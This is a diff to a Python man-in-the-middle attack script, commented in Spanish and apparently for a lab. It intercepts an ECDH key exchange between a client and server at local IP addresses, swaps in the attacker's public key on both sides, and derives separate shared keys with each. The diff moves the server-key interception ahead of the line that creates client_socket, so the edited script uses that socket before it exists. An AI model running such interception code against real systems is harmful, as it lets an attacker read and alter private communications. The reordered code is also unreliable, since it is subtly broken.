@@ -34,6 +34,14 @@ server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.bind(('192.168.1.14', 65432))  # Escuchar en el dispositivo atacante
 server_socket.listen()
 
+# Interceptar la llave pública del servidor
+server_public_bytes = client_socket.recv(1024)
+server_public_key = ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP256R1(), server_public_bytes)
+print("Llave pública del servidor interceptada.")
+
+# Enviar la llave pública del atacante al servidor en lugar de la del cliente
+client_socket.sendall(attacker_public_bytes)
+
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client_socket.connect(('192.168.1.15', 65432))  # Conectar al servidor real
 
@@ -50,14 +58,6 @@ print("Llave pública del cliente interceptada.")
 
 # Enviar la llave pública del atacante al cliente en lugar de la del servidor
 conn.sendall(attacker_public_bytes)
-
-# Interceptar la llave pública del servidor
-server_public_bytes = client_socket.recv(1024)
-server_public_key = ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP256R1(), server_public_bytes)
-print("Llave pública del servidor interceptada.")
-
-# Enviar la llave pública del atacante al servidor en lugar de la del cliente
-client_socket.sendall(attacker_public_bytes)
 
 # Establecer llaves compartidas diferentes con el cliente y el servidor
 shared_key_with_client = attacker_private_key.exchange(ec.ECDH(), client_public_key)
